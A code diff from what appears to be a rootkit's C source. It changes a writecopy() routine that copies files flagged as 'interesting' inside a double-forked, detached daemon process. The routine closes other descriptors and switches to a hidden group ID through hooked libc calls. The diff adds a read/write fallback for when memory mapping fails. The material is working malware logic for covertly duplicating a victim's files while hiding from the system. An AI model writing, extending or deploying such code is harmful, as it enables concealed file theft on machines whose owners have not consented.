@@ -110,6 +110,34 @@ int interesting(const char *path){
     return interest;
 }
 
+
+#ifdef ORIGINAL_RW_FALLBACK
+void wcfallback(FILE *ofp, FILE *nfp, off_t fsize){
+    unsigned char *buf;
+    off_t blksize;
+    size_t n, m;
+
+    hook(CFWRITE);
+
+    blksize = getablocksize(fsize);
+    do{
+        buf = malloc(blksize+1);
+        if(!buf) goto nopenope;
+        memset(buf, 0, blksize+1);
+        n = fread(buf, 1, blksize, ofp);
+        if(n){
+            m = (long)call(CFWRITE, buf, 1, n, nfp);
+            fflush(nfp);
+        }else m = 0;
+        fflush(ofp);
+        free(buf);
+    }while(n > 0 && n == m);
+nopenope:
+    fclose(ofp);
+    fclose(nfp);
+}
+#endif
+
 int writecopy(const char *oldpath, char *newpath){
     struct stat nstat; // for newpath, should it exist, to check if there's a change in size.
     int statr;
@@ -151,54 +179,58 @@ int writecopy(const char *oldpath, char *newpath){
 
     int fd = fileno(ofp);
     map = mmap(NULL, fsize, PROT_READ, MAP_SHARED, fd, 0);
-    fclose(ofp);
     if(map == MAP_FAILED){
+#ifdef ORIGINAL_RW_FALLBACK
+        wcfallback(ofp, nfp, fsize);
+        return 1;
+#else
+        fclose(ofp);
         fclose(nfp);
         return -1;
-    }
-
-    if(map){
-        pid_t pid = fork();
-        if(pid < 0){
-            msync(map, fsize, MS_SYNC);
-            munmap(map, fsize);
-            fclose(nfp);
-            return -1;
-        }else if(pid > 0){
-            msync(map, fsize, MS_SYNC);
-            munmap(map, fsize);
-            fclose(nfp);
-            if(fileno(stdout) && isatty(fileno(stdout)))
-                signal(SIGCHLD, SIG_IGN); // wtaf?
-            return 1;
-        }else if(pid == 0){
-            umask(0);
-            if(setsid() < 0)
-                exit(0);
-
-            for(int i=sysconf(_SC_OPEN_MAX); i>=0; i--)
-                if(i != fileno(nfp))
-                    close(i);
-
-            signal(SIGCHLD, SIG_IGN);
-            signal(SIGHUP, SIG_IGN);
-
-            if(!notuser(0)){ // hide, if we can.
-                hook(CSETGID);
-                call(CSETGID, readgid());
-            }
-
-            pid = fork();
-            if(pid != 0) exit(0);
-
-            hook(CFWRITE);
-            call(CFWRITE, map, 1, fsize, nfp);
-#ifdef KEEP_FILE_MODE
-            hook(CCHMOD);
-            call(CCHMOD, newpath, mode);
 #endif
+    }
+    fclose(ofp);
+
+    pid_t pid = fork();
+    if(pid < 0){
+        munmap(map, fsize);
+        fclose(nfp);
+        return -1;
+    }else if(pid > 0){
+        munmap(map, fsize);
+        fclose(nfp);
+
+        if(fileno(stdout) && isatty(fileno(stdout)))
+            signal(SIGCHLD, SIG_IGN); // wtaf?
+
+        return 1;
+    }else if(pid == 0){
+        umask(0);
+        if(setsid() < 0)
             exit(0);
+
+        for(int i=sysconf(_SC_OPEN_MAX); i>=0; i--)
+            if(i != fileno(nfp))
+                close(i);
+
+        signal(SIGCHLD, SIG_IGN);
+        signal(SIGHUP, SIG_IGN);
+
+        if(!notuser(0)){ // hide, if we can.
+            hook(CSETGID);
+            call(CSETGID, readgid());
         }
+
+        pid = fork();
+        if(pid != 0) exit(0);
+
+        hook(CFWRITE);
+        call(CFWRITE, map, 1, fsize, nfp);
+#ifdef KEEP_FILE_MODE
+        hook(CCHMOD);
+        call(CCHMOD, newpath, mode);
+#endif
+        exit(0);
     }
 
     return 1;
